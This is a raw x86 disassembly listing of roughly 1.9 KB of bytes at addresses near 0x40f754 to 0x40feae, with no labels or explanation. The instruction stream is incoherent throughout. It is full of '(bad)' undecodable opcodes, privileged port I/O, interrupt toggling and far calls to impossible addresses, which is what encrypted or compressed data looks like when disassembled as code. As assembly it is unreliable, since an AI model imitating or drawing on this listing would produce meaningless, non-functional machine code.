  40f754:	fild   DWORD PTR [ecx+esi*1]
  40f757:	pop    esp
  40f758:	cmp    BYTE PTR [esi],ch
  40f75a:	aam    0xab
  40f75c:	sti    
  40f75d:	(bad)  [edx+eax*8+0x17]
  40f761:	packssdw mm3,QWORD PTR [eax+0x7d]
  40f765:	jmp    0xae66e355
  40f76a:	pop    esp
  40f76b:	pop    ds
  40f76c:	jge    0x40f78b
  40f76e:	mov    ds:0x110c7a1d,eax
  40f773:	out    dx,al
  40f774:	ins    BYTE PTR es:[edi],dx
  40f775:	pop    edi
  40f776:	addr16 cmc 
  40f778:	pop    ds
  40f779:	push   ds
  40f77a:	push   edi
  40f77b:	and    ecx,edx
  40f77d:	enter  0x367f,0x4e
  40f781:	rcr    DWORD PTR [ecx],0xa
  40f784:	out    dx,al
  40f785:	push   ebp
  40f786:	test   eax,0xec7ea679
  40f78b:	push   edi
  40f78c:	cmc    
  40f78d:	lods   al,BYTE PTR ds:[esi]
  40f78e:	sub    al,0xb1
  40f790:	scas   al,BYTE PTR es:[edi]
  40f791:	sti    
  40f792:	repz adc DWORD PTR [ebx-0x5e06f1b3],ebp
  40f799:	jne    0x40f739
  40f79b:	adc    al,0xb1
  40f79d:	jo     0x40f785
  40f79f:	nop
  40f7a0:	jge    0x40f78d
  40f7a2:	sub    BYTE PTR gs:[edi],dh
  40f7a5:	call   0x167b:0x4200e9ab
  40f7ac:	xlat   BYTE PTR ds:[ebx]
  40f7ad:	fsubr  DWORD PTR [ebx]
  40f7af:	ror    DWORD PTR [eax],0x25
  40f7b2:	aas    
  40f7b3:	ja     0x40f739
  40f7b5:	mov    cs,WORD PTR [ebx+0x1bcc94b6]
  40f7bb:	call   0x2128:0x9ef11ca
  40f7c2:	inc    ecx
  40f7c3:	data16 mov bh,0x86
  40f7c6:	fcom   DWORD PTR es:[ebx+0x4b7e6654]
  40f7cd:	stc    
  40f7ce:	imul   edx,DWORD PTR [edx-0x7224819c],0xffffff86
  40f7d5:	jae    0x40f7c5
  40f7d7:	mov    al,0xf5
  40f7d9:	loope  0x40f7d6
  40f7db:	pop    esi
  40f7dc:	jnp    0x40f7df
  40f7de:	ret    0x7fcc
  40f7e1:	mov    ds:0x1839406a,eax
  40f7e6:	sti    
  40f7e7:	je     0x40f7b6
  40f7e9:	or     DWORD PTR [edx+0x3f4c689f],esp
  40f7ef:	xlat   BYTE PTR ds:[ebx]
  40f7f0:	mov    ebx,eax
  40f7f2:	sbb    ebx,ecx
  40f7f4:	mov    dh,0x70
  40f7f6:	jl     0x40f7f1
  40f7f8:	in     al,dx
  40f7f9:	mov    ch,0x29
  40f7fb:	ins    DWORD PTR es:[edi],dx
  40f7fc:	push   esi
  40f7fd:	mov    esi,ebx
  40f7ff:	stos   BYTE PTR es:[edi],al
  40f800:	mov    ebp,0xacfde00d
  40f805:	sbb    ebp,DWORD PTR [esi]
  40f807:	mov    ds:0x4f60972c,al
  40f80c:	cmp    eax,0xc31bbe71
  40f811:	inc    ecx
  40f812:	mov    cl,0x2e
  40f814:	scas   al,BYTE PTR es:[edi]
  40f815:	push   DWORD PTR [eax]
  40f817:	call   0x423af0
  40f81c:	jmp    0x40fd27
  40f821:	ds ret 
  40f823:	enter  0xd13c,0xd3
  40f827:	rol    cl,cl
  40f829:	pop    ebx
  40f82a:	xor    ebp,DWORD PTR [edi+ebx*4-0x34a3144b]
  40f831:	push   edx
  40f832:	pop    ebx
  40f833:	js     0x40f8ad
  40f835:	push   0x7c
  40f837:	js     0x40f8b1
  40f839:	ja     0x40f7eb
  40f83b:	ror    ecx,0x27
  40f83e:	push   ebx
  40f83f:	ret    
  40f840:	sbb    BYTE PTR [ebx+ebx*1-0x47],dl
  40f844:	gs lahf 
  40f846:	mov    cl,0x10
  40f848:	add    esi,DWORD PTR [eax+0x3a]
  40f84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f84c:	xlat   BYTE PTR ds:[ebx]
  40f84d:	add    BYTE PTR ds:0x60c83fe8,cl
  40f853:	add    ch,BYTE PTR [ebx+eax*8]
  40f856:	call   0x1214e562
  40f85b:	jmp    0xf78b69ad
  40f860:	or     cl,dh
  40f862:	stos   BYTE PTR es:[edi],al
  40f863:	cld    
  40f864:	call   0xd685:0x864423bb
  40f86b:	add    ch,BYTE PTR [edi-0x75b639a]
  40f871:	data16 scas al,BYTE PTR es:[edi]
  40f873:	and    eax,0xd6ff83b1
  40f878:	jo     0x40f8bf
  40f87a:	adc    BYTE PTR [ebx+0x7],bl
  40f87d:	mov    edi,0x9e7792e6
  40f882:	sti    
  40f883:	pop    ebx
  40f884:	scas   eax,DWORD PTR es:[edi]
  40f885:	xor    al,0x6d
  40f887:	sub    BYTE PTR [ecx-0x22ce05a9],bl
  40f88d:	imul   ebx,DWORD PTR [edx+0x49],0x2c
  40f891:	mov    ah,0x7d
  40f893:	adc    al,0xd4
  40f895:	in     eax,0x68
  40f897:	test   DWORD PTR [ebp+0x42f19457],0xb8c4c988
  40f8a1:	into   
  40f8a2:	dec    ebp
  40f8a3:	sbb    BYTE PTR [esi+0x53],dh
  40f8a6:	(bad)  
  40f8a7:	cld    
  40f8a8:	pop    eax
  40f8a9:	cld    
  40f8aa:	push   ss
  40f8ab:	xchg   bh,bl
  40f8ad:	mov    esp,DWORD PTR [edi-0x4159bd10]
  40f8b3:	dec    ebx
  40f8b4:	xor    esi,DWORD PTR [ebx+0x3e70c6f4]
  40f8ba:	cld    
  40f8bb:	xor    esi,ebp
  40f8bd:	es mov esp,0xa6fdd8ac
  40f8c3:	pop    ebp
  40f8c4:	pushf  
  40f8c5:	aaa    
  40f8c6:	pop    ecx
  40f8c7:	xor    DWORD PTR [edi+0x67],0x7f
  40f8cb:	sub    BYTE PTR cs:[esi+esi*4-0x60],0x42
  40f8d1:	cmp    cl,bh
  40f8d3:	xor    BYTE PTR [edx+eiz*4-0x64],0x98
  40f8d8:	jmp    DWORD PTR [ebx-0x3da852f7]
  40f8de:	cld    
  40f8df:	cdq    
  40f8e0:	pusha  
  40f8e1:	xor    eax,0xc0f9fa84
  40f8e6:	sub    ecx,eax
  40f8e8:	out    dx,eax
  40f8e9:	sbb    al,0x9c
  40f8eb:	stos   BYTE PTR es:[edi],al
  40f8ec:	imul   ecx,DWORD PTR [esi-0x31],0xa469078a
  40f8f3:	fsubr  DWORD PTR [ebp-0x53a1a25c]
  40f8f9:	stc    
  40f8fa:	cmp    ecx,edi
  40f8fc:	mov    al,0x4f
  40f8fe:	outs   dx,DWORD PTR ds:[esi]
  40f8ff:	ret    0x7e8a
  40f902:	scas   eax,DWORD PTR es:[edi]
  40f903:	es inc ecx
  40f905:	adc    DWORD PTR [eax+0x21ebcc43],ebp
  40f90b:	xchg   edi,eax
  40f90c:	adc    BYTE PTR [edx+ebp*2+0x4b],dl
  40f910:	scas   al,BYTE PTR es:[edi]
  40f911:	and    DWORD PTR [ecx+eiz*4+0x7f7ef0d9],esp
  40f918:	mov    ah,0x81
  40f91a:	scas   al,BYTE PTR es:[edi]
  40f91b:	shl    BYTE PTR ds:0xa1951476,1
  40f921:	add    ecx,0x7a
  40f924:	push   eax
  40f925:	cmp    eax,0x26c7f17
  40f92a:	mov    ah,0x38
  40f92c:	jg     0x40f91d
  40f92e:	xor    ax,0xabb9
  40f932:	pusha  
  40f933:	mov    ch,0x7c
  40f935:	std    
  40f936:	jle    0x40f944
  40f938:	adc    ecx,DWORD PTR [eax+0x20]
  40f93b:	pop    ebx
  40f93c:	sti    
  40f93d:	(bad)  
  40f93e:	cmp    DWORD PTR [eax+0x697d5563],edi
  40f944:	int3   
  40f945:	xor    al,0x63
  40f947:	sbb    ch,BYTE PTR [eax-0x6004c520]
  40f94d:	sub    dl,dh
  40f94f:	jp     0x40f9b9
  40f951:	(bad)  
  40f952:	mov    cl,0xba
  40f954:	cs push 0x1716d85d
  40f95a:	(bad)  
  40f95b:	shl    DWORD PTR [eax-0x25],1
  40f95e:	repz int3 
  40f960:	adc    ah,BYTE PTR [edi]
  40f962:	mov    al,0x2
  40f964:	xor    BYTE PTR [ebx],ch
  40f966:	dec    edi
  40f967:	dec    ebp
  40f968:	bound  edx,QWORD PTR [edi+0x18]
  40f96b:	test   esi,0x56c6b6a3
  40f971:	mov    bh,0x96
  40f973:	push   ecx
  40f974:	push   ebp
  40f975:	xor    al,0x56
  40f977:	scas   eax,DWORD PTR es:[edi]
  40f978:	dec    edx
  40f979:	mov    eax,0xd22e237
  40f97e:	pop    ss
  40f97f:	inc    eax
  40f980:	mov    ?,WORD PTR [ebp+0x53]
  40f983:	shl    ch,cl
  40f985:	mov    ebx,0xb573df21
  40f98a:	cmp    esi,ecx
  40f98c:	daa    
  40f98d:	outs   dx,BYTE PTR ds:[esi]
  40f98e:	retf   0xb32c
  40f991:	jmp    0x40f96b
  40f993:	xor    ch,BYTE PTR [esi-0x5efa6fd9]
  40f999:	or     al,0x3b
  40f99b:	mov    ah,0xe8
  40f99d:	test   BYTE PTR [ebp-0xd7392e],cl
  40f9a3:	dec    ecx
  40f9a4:	mov    edi,0x7dfc049a
  40f9a9:	sub    al,0x74
  40f9ab:	xor    edi,DWORD PTR [ebp-0x6eb6a34e]
  40f9b1:	jg     0x40f9f7
  40f9b3:	(bad)  
  40f9b4:	push   edx
  40f9b5:	iret   
  40f9b6:	shl    DWORD PTR [ebp+0x38],cl
  40f9b9:	mov    ch,0x6b
  40f9bb:	and    al,0xae
  40f9bd:	mov    dh,0x11
  40f9bf:	jbe    0x40f9df
  40f9c1:	mov    dh,BYTE PTR [ebx-0x2cf206]
  40f9c7:	clc    
  40f9c8:	jge    0x40f94a
  40f9ca:	sub    al,0xf7
  40f9cc:	mov    eax,0xc5e64ff3
  40f9d1:	xor    eax,DWORD PTR [esi+ebx*2]
  40f9d4:	add    eax,0x81510d4d
  40f9d9:	stos   DWORD PTR es:[edi],eax
  40f9da:	jo     0x40f9de
  40f9dc:	jae    0x40fa37
  40f9de:	mov    ah,0x7f
  40f9e0:	stos   BYTE PTR es:[edi],al
  40f9e1:	jg     0x40f991
  40f9e3:	cs cli 
  40f9e5:	sahf   
  40f9e6:	xlat   BYTE PTR ds:[ebx]
  40f9e7:	nop
  40f9e8:	add    esi,DWORD PTR [edi]
  40f9ea:	(bad)  
  40f9eb:	inc    dh
  40f9ed:	je     0x40f9ef
  40f9ef:	loope  0x40fa28
  40f9f1:	lods   al,BYTE PTR ds:[esi]
  40f9f2:	cmp    BYTE PTR [edi-0x2c5776ae],bl
  40f9f8:	out    dx,eax
  40f9f9:	cwde   
  40f9fa:	lea    edx,[ecx-0x47c295c2]
  40fa00:	shr    BYTE PTR [ebx+0x12e77020],cl
  40fa06:	inc    ebx
  40fa07:	add    eax,0x5d89f4e0
  40fa0c:	loopne 0x40f99f
  40fa0e:	push   esp
  40fa0f:	sbb    esp,DWORD PTR [edi+0x6748589f]
  40fa15:	push   ss
  40fa16:	sahf   
  40fa17:	out    0x1,eax
  40fa19:	mov    eax,DWORD PTR [edi]
  40fa1b:	xchg   ebx,eax
  40fa1c:	add    al,0xaa
  40fa1e:	popf   
  40fa1f:	push   edx
  40fa20:	je     0x40fa56
  40fa22:	lods   al,BYTE PTR ds:[esi]
  40fa23:	push   esp
  40fa24:	sbb    ebp,DWORD PTR [ebp+0x63e8b3f5]
  40fa2a:	xor    DWORD PTR [esi-0x79],0xffffff8a
  40fa2e:	fdiv   QWORD PTR [ebp+0x49026430]
  40fa34:	sbb    BYTE PTR [esi],ah
  40fa36:	mov    ebx,ecx
  40fa38:	sub    DWORD PTR [ecx-0x71],0xfd6ebcb4
  40fa3f:	mov    dh,0x3c
  40fa41:	adc    BYTE PTR [eax],ah
  40fa43:	xor    DWORD PTR [edi-0x36783a77],esi
  40fa49:	xchg   ecx,eax
  40fa4a:	xchg   esp,eax
  40fa4b:	mov    dh,0x6f
  40fa4d:	popa   
  40fa4e:	pop    esi
  40fa4f:	ss call 0xdc73:0x852b086c
  40fa57:	stc    
  40fa58:	inc    ebp
  40fa59:	cmp    al,0xfb
  40fa5b:	fwait
  40fa5c:	dec    bp
  40fa5e:	mov    cl,0x61
  40fa60:	xor    DWORD PTR [esi+0xdfefc78],edi
  40fa66:	add    eax,0x730c2de5
  40fa6b:	and    cx,WORD PTR [esi]
  40fa6e:	push   es
  40fa6f:	lahf   
  40fa70:	push   0x73
  40fa72:	sbb    al,0x59
  40fa74:	mov    ebp,0xab06a913
  40fa79:	dec    eax
  40fa7a:	ret    
  40fa7b:	push   ebx
  40fa7c:	dec    ebp
  40fa7d:	out    0xef,eax
  40fa7f:	lds    edx,FWORD PTR [ebx]
  40fa81:	pop    esi
  40fa82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa83:	js     0x40fa41
  40fa85:	mov    ebp,0x9fec0d65
  40fa8a:	out    dx,eax
  40fa8b:	push   0x38
  40fa8d:	xlat   BYTE PTR ds:[ebx]
  40fa8e:	sub    dh,BYTE PTR [ebp+ebx*4-0x5562f3cf]
  40fa95:	inc    ecx
  40fa96:	xchg   ecx,eax
  40fa97:	mov    WORD PTR [edx+0x14],cs
  40fa9a:	mov    edi,0xcd695faa
  40fa9f:	imul   edi,ebp,0xc6ec8cbc
  40faa5:	das    
  40faa6:	imul   bl
  40faa8:	inc    ebp
  40faa9:	push   ss
  40faaa:	cmp    BYTE PTR ss:[edx-0x5b],dl
  40faae:	xchg   esp,eax
  40faaf:	dec    eax
  40fab0:	xchg   ebp,eax
  40fab1:	add    eax,0x4683bf66
  40fab6:	pop    edx
  40fab7:	push   ss
  40fab8:	adc    al,0x64
  40faba:	push   es
  40fabb:	mov    eax,0xfb2d48f0
  40fac0:	lahf   
  40fac1:	pop    esp
  40fac2:	clc    
  40fac3:	push   ecx
  40fac4:	dec    esi
  40fac5:	cmp    eax,0xd6bb21f7
  40faca:	jecxz  0x40fb3b
  40facc:	(bad)  
  40facd:	jmp    0x40fb05
  40facf:	(bad)  
  40fad0:	mov    bh,0x60
  40fad2:	int    0xaf
  40fad4:	gs mov ecx,0x440b6f47
  40fada:	add    eax,0xd8f2ff6b
  40fadf:	ins    BYTE PTR es:[edi],dx
  40fae0:	and    dl,dl
  40fae2:	mov    WORD PTR [esi-0x66d8d9ba],cs
  40fae8:	mov    ch,0xab
  40faea:	xor    ebp,DWORD PTR [edx+0x364baa31]
  40faf0:	xchg   esp,eax
  40faf1:	(bad)  
  40faf2:	sub    al,0x3f
  40faf4:	inc    esi
  40faf5:	cwde   
  40faf6:	sub    al,0xbb
  40faf8:	sub    eax,0xdc1030a4
  40fafd:	aad    0x4e
  40faff:	pushf  
  40fb00:	std    
  40fb01:	push   ebp
  40fb02:	imul   ebx,DWORD PTR [esi],0xbc6bc92e
  40fb08:	in     al,dx
  40fb09:	stos   BYTE PTR es:[edi],al
  40fb0a:	push   ecx
  40fb0b:	fstp   QWORD PTR ds:0x877107e9
  40fb11:	mov    dl,0xeb
  40fb13:	bound  esp,QWORD PTR [edx-0xd]
  40fb16:	cld    
  40fb17:	mov    esi,0x5cb1c47c
  40fb1c:	mov    WORD PTR [edi],gs
  40fb1e:	jmp    0xdccbccbb
  40fb23:	fistp  DWORD PTR [eax-0xf9df9ad]
  40fb29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb2a:	add    al,0x3e
  40fb2c:	popf   
  40fb2d:	(bad)  
  40fb2e:	jb     0x40fbad
  40fb30:	xor    DWORD PTR [esi+eax*1-0x6fc50ebc],edi
  40fb37:	jecxz  0x40fb72
  40fb39:	mov    ecx,0x9491914c
  40fb3e:	cmp    DWORD PTR [edi-0x52],ebp
  40fb41:	popa   
  40fb42:	mov    cl,0x94
  40fb44:	and    dh,0x72
  40fb47:	xchg   edx,eax
  40fb48:	aaa    
  40fb49:	pop    ebx
  40fb4a:	mov    esi,0xe61c0407
  40fb4f:	mov    ah,0xe1
  40fb51:	popf   
  40fb52:	jmp    0xb4ddd697
  40fb57:	lock retf 
  40fb59:	retf   
  40fb5a:	sar    bl,1
  40fb5c:	call   0x761f3f4c
  40fb61:	sahf   
  40fb62:	add    eax,0x3cc573cc
  40fb67:	test   BYTE PTR [ecx+0x10723e53],bh
  40fb6d:	aam    0x61
  40fb6f:	xor    eax,0x535eaa71
  40fb74:	loopne 0x40fba1
  40fb76:	fmulp  st(0),st
  40fb78:	lods   eax,DWORD PTR ds:[esi]
  40fb79:	dec    ebp
  40fb7a:	inc    ebp
  40fb7b:	lock xchg ax,ax
  40fb7e:	fwait
  40fb7f:	or     DWORD PTR [esi-0x54179497],esi
  40fb85:	cwde   
  40fb86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb87:	(bad)  
  40fb88:	jne    0x40fbb8
  40fb8a:	das    
  40fb8b:	mov    al,ds:0x6f793cc9
  40fb90:	adc    bl,BYTE PTR [ecx+esi*2+0x7c911e08]
  40fb97:	ss cli 
  40fb99:	jno    0x40fb1d
  40fb9b:	xchg   ecx,eax
  40fb9c:	cli    
  40fb9d:	lods   eax,DWORD PTR ds:[esi]
  40fb9e:	or     edx,DWORD PTR [ebp+0xc93ee71]
  40fba4:	loop   0x40fc06
  40fba6:	test   DWORD PTR [ebx+ebx*4],ebp
  40fba9:	push   cs
  40fbaa:	not    DWORD PTR [esi]
  40fbac:	push   es
  40fbad:	mov    DWORD PTR [edi+0x28],ebp
  40fbb0:	xor    dh,BYTE PTR ds:0xa8a31d59
  40fbb6:	pop    ebp
  40fbb7:	jl     0x40fbc1
  40fbb9:	pop    eax
  40fbba:	inc    ecx
  40fbbb:	mov    ah,0x1d
  40fbbd:	sti    
  40fbbe:	mov    bh,0x6e
  40fbc0:	xor    BYTE PTR [eax+0x29],0x89
  40fbc4:	xor    DWORD PTR [ebp-0x2ae19908],ecx
  40fbca:	cdq    
  40fbcb:	test   eax,0xfbaad1a1
  40fbd0:	dec    ecx
  40fbd1:	lea    eax,[edi-0x214f972c]
  40fbd7:	xchg   esi,eax
  40fbd8:	cmc    
  40fbd9:	jbe    0x40fc42
  40fbdb:	call   esi
  40fbdd:	cmp    eax,0xda6191c8
  40fbe2:	stos   BYTE PTR es:[edi],al
  40fbe3:	(bad)  
  40fbe4:	loopne 0x40fbd8
  40fbe6:	inc    ecx
  40fbe7:	and    edx,ebx
  40fbe9:	mov    ebp,0x40c9679
  40fbee:	push   eax
  40fbef:	or     ecx,DWORD PTR [eax]
  40fbf1:	mov    ebx,gs
  40fbf3:	mov    al,0xc5
  40fbf5:	imul   ecx,ecx,0x36d99c84
  40fbfb:	sub    DWORD PTR [edi+0x1d8fac20],ecx
  40fc01:	clc    
  40fc02:	adc    al,0x61
  40fc04:	icebp  
  40fc05:	ins    DWORD PTR es:[edi],dx
  40fc06:	lods   eax,DWORD PTR ds:[esi]
  40fc07:	fisubr WORD PTR [edx-0x60577ddd]
  40fc0d:	stc    
  40fc0e:	ins    DWORD PTR es:[edi],dx
  40fc0f:	cli    
  40fc10:	repz xor eax,eax
  40fc13:	outs   dx,BYTE PTR ds:[esi]
  40fc14:	fist   DWORD PTR [eax-0x46]
  40fc17:	ror    edx,cl
  40fc19:	xor    eax,0xef20ba85
  40fc1e:	sub    eax,DWORD PTR [ebx+ecx*8]
  40fc21:	hlt    
  40fc22:	and    ch,dh
  40fc24:	push   esi
  40fc25:	push   esi
  40fc26:	bound  esp,QWORD PTR [esi+0x12]
  40fc29:	ss sub eax,0xc4cf546b
  40fc2f:	(bad)  
  40fc30:	les    esp,FWORD PTR [ebx]
  40fc32:	pop    es
  40fc33:	push   ebx
  40fc34:	loopne 0x40fc20
  40fc36:	(bad)
  40fc39:	fsub   st(5),st
  40fc3b:	int    0xe
  40fc3d:	lds    ecx,FWORD PTR [edx+0x1096463d]
  40fc43:	sub    edi,eax
  40fc45:	mov    edi,0xd254e49a
  40fc4a:	data16 test BYTE PTR [ebx+0x4],ah
  40fc4e:	mov    ebp,0x634fe8d6
  40fc53:	mov    dl,0xb7
  40fc55:	idiv   DWORD PTR [ebx]
  40fc57:	push   0xffffffaf
  40fc59:	rcr    ebx,1
  40fc5b:	sbb    eax,0x4ee9de2f
  40fc60:	or     BYTE PTR [edx+0x52],dh
  40fc63:	sbb    BYTE PTR [esi],bl
  40fc65:	cli    
  40fc66:	repz arpl bp,cx
  40fc69:	mov    ds:0xcd98a2d0,eax
  40fc6e:	cli    
  40fc6f:	jb     0x40fc8a
  40fc71:	mov    eax,0xbfe51bc4
  40fc76:	mov    bh,dl
  40fc78:	jp     0x40fce2
  40fc7a:	dec    esi
  40fc7b:	popa   
  40fc7c:	dec    eax
  40fc7d:	dec    edx
  40fc7e:	pushf  
  40fc7f:	aas    
  40fc80:	xchg   edx,eax
  40fc81:	cmp    eax,0x36ad143
  40fc86:	aaa    
  40fc87:	jae    0x40fc45
  40fc89:	or     DWORD PTR [edx+0x4598a667],esp
  40fc8f:	or     DWORD PTR fs:[ecx],ebp
  40fc92:	jle    0x40fc93
  40fc94:	sbb    ch,cl
  40fc96:	adc    dh,BYTE PTR ds:0x9d1cb07f
  40fc9c:	mov    dh,0xb8
  40fc9e:	push   ecx
  40fc9f:	int3   
  40fca0:	jle    0x40fc47
  40fca2:	cdq    
  40fca3:	jl     0x40fd06
  40fca5:	xor    BYTE PTR [edi+0x14],0xb9
  40fca9:	jle    0x40fd10
  40fcab:	add    al,0x12
  40fcad:	aam    0x8a
  40fcaf:	mov    eax,ds:0x664bfd9a
  40fcb4:	bound  ebp,QWORD PTR [ecx-0x50]
  40fcb7:	xchg   DWORD PTR [ecx],eax
  40fcb9:	dec    ecx
  40fcba:	aad    0xc7
  40fcbc:	cwde   
  40fcbd:	aad    0x67
  40fcbf:	sbb    ebp,DWORD PTR [edx]
  40fcc1:	add    BYTE PTR [edi+0x45],bl
  40fcc4:	mov    eax,ds:0x41e972dd
  40fcc9:	lock fucomip st,st(2)
  40fccc:	add    BYTE PTR [esi+0x1ff7f67],bl
  40fcd2:	pop    es
  40fcd3:	mov    edx,ebp
  40fcd5:	mov    bh,0xf1
  40fcd7:	push   eax
  40fcd8:	jge    0x40fcdc
  40fcda:	xchg   esi,eax
  40fcdb:	jmp    0x40fcea
  40fcdd:	push   ebp
  40fcde:	mov    ds:0x6527cd4c,al
  40fce3:	inc    ebx
  40fce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce5:	mov    al,0x7a
  40fce7:	pop    ss
  40fce8:	inc    esi
  40fce9:	jbe    0x40fca3
  40fceb:	enter  0x9906,0xa1
  40fcef:	bound  eax,QWORD PTR [edi]
  40fcf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcf2:	or     al,0xa4
  40fcf4:	pop    edx
  40fcf5:	gs cmp eax,0xf4202bea
  40fcfb:	lea    esi,[edi+0x4f0ce58d]
  40fd01:	xchg   edi,eax
  40fd02:	das    
  40fd03:	mov    fs,WORD PTR [ebx+eax*8+0x5]
  40fd07:	outs   dx,DWORD PTR ds:[esi]
  40fd08:	test   al,0x2f
  40fd0a:	pop    ebx
  40fd0b:	ss mov dl,0x52
  40fd0e:	outs   dx,BYTE PTR ds:[esi]
  40fd0f:	stos   BYTE PTR es:[edi],al
  40fd10:	adc    BYTE PTR [edi],0x60
  40fd13:	mov    bl,0x6
  40fd15:	lahf   
  40fd16:	shl    BYTE PTR [eax+0x5b60b877],1
  40fd1c:	cmp    eax,0xfada656d
  40fd21:	lahf   
  40fd22:	fdivp  st(2),st
  40fd24:	mov    esp,0x4d8b3f39
  40fd29:	fsubr  st,st(1)
  40fd2b:	push   es
  40fd2c:	add    eax,0x3ecc0000
  40fd31:	into   
  40fd32:	(bad)  
  40fd33:	rcl    dh,cl
  40fd35:	aam    0xca
  40fd37:	xchg   DWORD PTR [ebx-0x1d],esi
  40fd3a:	(bad)  
  40fd3c:	bnd jge 0x40fd2e
  40fd3f:	mov    esp,0x6a78785e
  40fd44:	jl     0x40fdbe
  40fd46:	js     0x40fcf4
  40fd48:	mov    ds:0xce14e05d,eax
  40fd4d:	mov    ecx,0xd5fb360
  40fd52:	xchg   ecx,eax
  40fd53:	dec    edx
  40fd54:	stos   DWORD PTR es:[edi],eax
  40fd55:	inc    ebx
  40fd56:	jnp    0x40fd94
  40fd58:	fisub  DWORD PTR [ecx]
  40fd5a:	cmc    
  40fd5b:	push   cs
  40fd5c:	ja     0x40fd1d
  40fd5e:	sub    dl,BYTE PTR [ebp+0xf]
  40fd61:	nop
  40fd62:	xor    eax,0x3e6aed00
  40fd67:	loope  0x40fd92
  40fd69:	neg    DWORD PTR [ebx]
  40fd6b:	les    edx,FWORD PTR [ebp+0x62]
  40fd6e:	mov    eax,0x4750e33e
  40fd73:	sub    BYTE PTR [esi+0x9],dh
  40fd76:	mov    ebx,0x1a8fd961
  40fd7b:	mov    bh,0x7e
  40fd7d:	and    bl,BYTE PTR [eax+0xd]
  40fd80:	xchg   BYTE PTR [esi-0x3a127e78],cl
  40fd86:	(bad)  
  40fd87:	cwde   
  40fd88:	in     eax,dx
  40fd89:	sahf   
  40fd8a:	push   0xe9eac6b0
  40fd8f:	test   eax,0xc9960193
  40fd94:	aaa    
  40fd95:	or     ch,BYTE PTR [ecx]
  40fd97:	xchg   ebx,eax
  40fd98:	and    dh,BYTE PTR [eax]
  40fd9a:	adc    cl,BYTE PTR [ebx+edx*2-0x5d7cb1fb]
  40fda1:	aas    
  40fda2:	pop    esp
  40fda3:	clc    
  40fda4:	inc    edx
  40fda5:	cmp    BYTE PTR [esp+ebx*1+0x52e3eb8],dh
  40fdac:	inc    BYTE PTR [edi-0x205b298]
  40fdb2:	ffreep st(6)
  40fdb4:	fistp  WORD PTR [eax]
  40fdb6:	sbb    edi,DWORD PTR [edi-0x6e]
  40fdb9:	fldenv [esi]
  40fdbb:	mov    ebp,esi
  40fdbd:	push   ecx
  40fdbe:	adc    DWORD PTR [esi],edx
  40fdc0:	sbb    dl,dh
  40fdc2:	rcl    DWORD PTR [edi+eiz*1],cl
  40fdc5:	call   esp
  40fdc7:	pop    es
  40fdc8:	scas   eax,DWORD PTR es:[edi]
  40fdc9:	jne    0x40fdfd
  40fdcb:	cmp    eax,0x6203d2fc
  40fdd0:	test   esi,esp
  40fdd2:	dec    eax
  40fdd3:	mov    cl,0x83
  40fdd5:	xchg   ebx,eax
  40fdd6:	out    0x9c,al
  40fdd8:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fdda:	inc    ecx
  40fddb:	mov    bh,0xb1
  40fddd:	sub    DWORD PTR ds:0xe813c9f,esp
  40fde3:	arpl   WORD PTR [edi+0x78],sp
  40fde6:	(bad)  
  40fde8:	jnp    0x40fdcc
  40fdea:	and    al,0xf5
  40fdec:	shr    BYTE PTR [ecx-0x7a],0x4d
  40fdf0:	sub    dh,BYTE PTR ds:0xfb3e3173
  40fdf6:	leave  
  40fdf7:	fisub  WORD PTR [esi+0x7d6d860a]
  40fdfd:	out    dx,eax
  40fdfe:	call   0x5e938081
  40fe03:	(bad)  
  40fe04:	out    dx,al
  40fe05:	xor    ecx,0xe6102191
  40fe0b:	push   ds
  40fe0c:	addr16 xor eax,0xf20a3b34
  40fe12:	ds in  al,0x69
  40fe15:	sbb    DWORD PTR [edi],esi
  40fe17:	lds    esp,FWORD PTR [esi]
  40fe19:	(bad)  
  40fe1a:	cmc    
  40fe1b:	or     DWORD PTR [esi+ecx*2-0x6f6b7759],ecx
  40fe22:	push   eax
  40fe23:	adc    DWORD PTR [esi+0x51],edi
  40fe26:	pushf  
  40fe27:	clc    
  40fe28:	fucomip st,st(0)
  40fe2a:	(bad)  
  40fe2b:	retf   0x78dd
  40fe2e:	sub    al,0xac
  40fe30:	push   ds
  40fe31:	push   edx
  40fe32:	jo     0x40fe01
  40fe34:	loope  0x40fe91
  40fe36:	xor    al,0xf1
  40fe38:	dec    ebx
  40fe39:	test   ebp,0x4d46c710
  40fe3f:	mov    edi,0x6c091c09
  40fe44:	call   0xcf464227
  40fe49:	out    dx,eax
  40fe4a:	jb     0x40fe96
  40fe4c:	push   es
  40fe4d:	sub    esi,DWORD PTR [edx+0x79]
  40fe50:	xor    ch,BYTE PTR [ecx]
  40fe52:	ins    DWORD PTR es:[edi],dx
  40fe53:	mov    ch,0x4
  40fe55:	add    DWORD PTR ds:0x4c8c630f,edi
  40fe5b:	xor    eax,0xae4a552
  40fe60:	sbb    DWORD PTR [ebx+ecx*4+0x63],ecx
  40fe64:	aad    0x6e
  40fe66:	pop    eax
  40fe67:	xor    edx,DWORD PTR [ebx]
  40fe69:	fnstenv [ecx-0xb]
  40fe6c:	add    ebx,edi
  40fe6e:	stos   DWORD PTR es:[edi],eax
  40fe6f:	mov    eax,0x9f530b61
  40fe74:	pop    es
  40fe75:	sbb    al,0x8d
  40fe77:	jbe    0x40fed7
  40fe79:	and    esp,DWORD PTR [ebp-0x47fa94ab]
  40fe7f:	push   0x7a
  40fe81:	adc    ebp,ebp
  40fe83:	ins    BYTE PTR es:[edi],dx
  40fe84:	jge    0x40fef4
  40fe86:	xchg   ebx,eax
  40fe87:	jne    0x40fea5
  40fe89:	xchg   ebx,eax
  40fe8a:	mov    eax,ds:0x191dc4e0
  40fe8f:	and    esp,esi
  40fe91:	daa    
  40fe92:	(bad)  
  40fe93:	out    0x6c,eax
  40fe95:	adc    eax,0x331aa45d
  40fe9a:	push   ebp
  40fe9b:	int3   
  40fe9c:	cmp    DWORD PTR [ecx+esi*8],esi
  40fe9f:	and    al,0x2d
  40fea1:	in     al,0x1d
  40fea3:	addr16 jle 0x40fe65
  40fea6:	popf   
  40fea7:	xor    al,BYTE PTR [edx-0x315e8ca7]
  40fead:	push   edx
  40feae:	fiadd  WORD PTR [ebx-0x4d8131f4]
